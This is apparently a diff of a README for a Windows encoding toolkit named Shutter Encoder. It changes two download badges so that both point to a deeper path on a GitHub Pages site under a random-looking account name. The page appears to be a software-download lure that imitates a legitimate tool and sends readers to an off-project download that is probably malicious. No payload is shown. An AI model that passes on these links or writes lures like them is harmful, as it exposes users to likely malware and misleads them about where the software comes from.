@@ -16,7 +16,7 @@ Shutter Encoder is a professional encoding toolkit for Windows that gives editor
 <div align="center">
   <h3>Precise, delivery-ready encoding for serious editors</h3>
 
-  [![Download Shutter Encoder](https://img.shields.io/badge/⬇_Download_Shutter_Encoder_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/)
+  [![Download Shutter Encoder](https://img.shields.io/badge/⬇_Download_Shutter_Encoder_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/Shutter-Encoder-Pro-Toolkit-App/)
 
 </div>
 
@@ -93,7 +93,7 @@ For help with Shutter Encoder, open the built-in Help or Support section inside 
 <div align="center">
   <h3>Ready to get started with Shutter Encoder?</h3>
 
-  [![Download Shutter Encoder](https://img.shields.io/badge/⬇_Download_Shutter_Encoder_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/)
+  [![Download Shutter Encoder](https://img.shields.io/badge/⬇_Download_Shutter_Encoder_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/Shutter-Encoder-Pro-Toolkit-App/)
 
 </div>
 
